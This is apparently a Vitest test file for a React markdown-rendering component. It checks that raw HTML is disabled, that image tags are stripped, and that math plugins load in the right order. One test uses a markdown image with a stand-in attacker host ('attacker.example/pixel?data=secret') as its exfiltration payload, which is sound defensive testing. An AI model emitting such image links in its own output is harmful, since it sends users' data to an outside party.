import { renderToStaticMarkup } from "react-dom/server";
import type React from "react";
import { beforeEach, describe, expect, it, vi } from "vitest";

type MockStreamdownProps = {
  children?: React.ReactNode;
  components: {
    img: React.ComponentType<React.ImgHTMLAttributes<HTMLImageElement>>;
  };
  rehypePlugins?: unknown[];
  remarkPlugins?: unknown[];
};

const streamdownMock = vi.hoisted(() =>
  vi.fn((props: MockStreamdownProps) => props.children),
);

vi.mock("streamdown", () => ({
  Streamdown: streamdownMock,
  defaultRehypePlugins: {
    katex: "katex",
    raw: "raw",
  },
  defaultRemarkPlugins: {
    gfm: "gfm",
    math: "math",
  },
}));

import StreamingMarkdownContent from "./StreamingMarkdownContent";
import remarkSingleDollarMathGuard from "@/utils/remarkSingleDollarMathGuard";

describe("StreamingMarkdownContent", () => {
  beforeEach(() => {
    streamdownMock.mockClear();
  });

  it("does not enable raw HTML parsing", () => {
    renderToStaticMarkup(
      <StreamingMarkdownContent content="<iframe></iframe>" />,
    );

    const props = streamdownMock.mock.calls[0][0];
    expect(props.rehypePlugins).toEqual(["katex"]);
    expect(props.rehypePlugins).not.toContain("raw");
  });

  it("does not render markdown image src values", () => {
    renderToStaticMarkup(
      <StreamingMarkdownContent content="![secret](https://attacker.example/pixel?data=secret)" />,
    );

    const props = streamdownMock.mock.calls[0][0];
    const Img = props.components.img;
    const html = renderToStaticMarkup(
      <Img alt="secret" src="https://attacker.example/pixel?data=secret" />,
    );

    expect(html).not.toContain("<img");
    expect(html).not.toContain("attacker.example");
    expect(html).toContain("secret");
  });

  it("enables single-dollar math and includes the currency guard, in order", () => {
    renderToStaticMarkup(<StreamingMarkdownContent content="$x$" />);

    const props = streamdownMock.mock.calls[0][0] as MockStreamdownProps & {
      remarkPlugins: unknown[];
    };
    const plugins = props.remarkPlugins;
    // gfm (mocked as "gfm"), then [remarkMath, {singleDollarTextMath:true}],
    // then the guard, then the citation parser.
    expect(plugins[0]).toBe("gfm");
    expect(Array.isArray(plugins[1])).toBe(true);
    expect(
      (plugins[1] as [unknown, { singleDollarTextMath?: boolean }])[1],
    ).toEqual({
      singleDollarTextMath: true,
    });
    expect(plugins[2]).toBe(remarkSingleDollarMathGuard);
  });
});
